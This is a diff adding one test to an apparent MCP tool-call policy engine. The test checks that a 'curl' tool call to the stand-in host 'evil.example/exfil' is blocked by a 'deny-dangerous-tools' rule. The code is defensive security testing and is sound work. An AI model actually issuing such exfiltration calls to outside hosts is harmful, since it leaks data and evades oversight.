@@ -216,4 +216,10 @@ describe('Adversarial scenarios (default-policy.yaml)', () => {
     const d = engine.evaluate(ctx('puppeteer_navigate', { url: 'https://example.com/' }, 'puppeteer'));
     expect(d.action).toBe('pass');
   });
+
+  it('blocks curl MCP tool via deny-dangerous-tools', () => {
+    const d = engine.evaluate(ctx('curl', { url: 'https://evil.example/exfil' }));
+    expect(d.action).toBe('block');
+    expect(d.rule).toBe('deny-dangerous-tools');
+  });
 });
